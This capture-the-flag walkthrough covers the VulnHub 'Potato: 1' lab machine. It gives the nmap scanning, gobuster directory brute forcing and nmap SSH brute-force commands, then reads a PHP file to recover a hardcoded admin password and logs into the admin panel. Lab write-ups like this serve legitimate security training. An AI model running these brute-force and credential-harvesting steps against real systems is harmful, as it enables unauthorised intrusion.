:::::::::::::: page
# Potato: 1 {#potato-1 .title}

\

## 

## Potato: 1

- **[Potato: 1]{style="color:#663e0e;"}** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/potato-1,529/>

![](images/765-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#3584e4;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/765-2.png)

- Find available port in the machine :

::: codebox
    nmap -v -p- 192.168.2.124
:::

![](images/765-3.png)

::: codebox
    nmap -sC -sV -A 192.168.2.124
:::

![](images/765-4.png)

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.124
:::

![](images/765-5.png)

1.  [Web Enumeration]{style="color:#3584e4;"} :

- IP visit in browser : <http://192.168.2.124/>

![](images/765-6.png)

- Now run the gobuster for directory brute force :

::: codebox
    gobuster dir -u http://192.168.2.124/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
:::

![](images/765-7.png)

- Visit the parameter : <http://192.168.2.124/admin/>
  <http://192.168.2.124/potato/>

<!-- -->

- Again brute force in /admin parameter :

::: codebox
    gobuster dir -u http://192.168.2.124/admin/ -w /usr/share/wordlists/dirb/common.txt
:::

![](images/765-8.png)

- Visit found parameter : <http://192.168.2.124/admin/logs/>

![](images/765-9.png)

1.  [SSH Brute Force]{style="color:#3584e4;"} :

- Now SSH brute-force :

::: codebox
    nmap --script=ssh-brute.nse -p 22 192.168.2.124
:::

![](images/765-10.png)

- Login ssh :

::: codebox
    ssh webadmin@192.168.2.124
:::

![](images/765-11.png) ![](images/765-12.png)

- Navigate the directory :

::: codebox
    cd /var/www/html/admin
:::

- Found dashboard.php file .

<!-- -->

- Read the file :

::: codebox
    cat dashboard.php
:::

![](images/765-13.png)

- Now login the admin page :

::: codebox
    Username : admin
    Password : serdesfsefhijosefjtfgyuhjiosefdfthgyjh
:::

- 

![](images/765-14.png) ![](images/765-15.png)
::::::::::::::
